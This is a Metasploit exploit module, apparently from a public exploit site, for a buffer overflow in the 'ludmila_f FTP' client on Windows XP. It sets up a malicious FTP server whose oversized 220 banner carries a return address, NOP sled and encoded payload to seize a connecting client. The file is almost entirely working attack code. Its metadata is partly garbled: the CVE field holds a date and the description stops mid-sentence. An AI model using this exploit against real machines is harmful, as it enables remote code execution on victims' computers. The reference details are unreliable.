# $Id: ludmila_f_FTP.rb 16847 2011-09-07 03:30:45Z Iraq $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::TcpServer
 
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'ludmila_f FTP Remote Buffer Overflow Exploit',
            'Description'    => %q{
                    This module exploits a buffer overflow in the ludmila_f FTP
               
            },
            'Author'     => [ 'Angel Injection' ],
            'License'        => MSF_LICENSE,
            
            'References'     =>
                [
                    [ 'CVE', '7/9/2011' ],
                    [ 'OSVDB', '16847' ],
                    [ 'URL', 'http://www.1337day.com/exploits/16847' ],
                ],
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'seh',
                },
            'Payload'        =>
                {
                    'Space'    => 1500,
                    'BadChars' => "\x00\x0a\x0d\x20",
                    'StackAdjustment' => -3600,
                },
            'Platform'       => 'win',
            'Targets'        =>
                [
                    # Tested against - XP SP3 English OK.
                    [ 'Universal',  { 'Ret' => 0x7609e405 } ], # WCMDPA10 (part of ludmila_f FTP)
                ],
            'Privileged'     => false,
            'DefaultTarget'  => 0,
            'DisclosureDate' => '7/9/2011'))
 
        register_options(
            [
                OptPort.new('SRVPORT', [ true, "The FTP daemon port to listen on", 21 ]),
            ], self.class)
    end
 
    def on_client_connect(client)
        return if ((p = regenerate_payload(client)) == nil)
 
        buffer =  "220 "
        buffer << rand_text_numeric(2064)
        buffer << [target.ret].pack('V')
        buffer << make_nops(20)
        buffer << payload.encoded
        buffer << "\r\n"
        client.put(buffer)
    end
 
end 



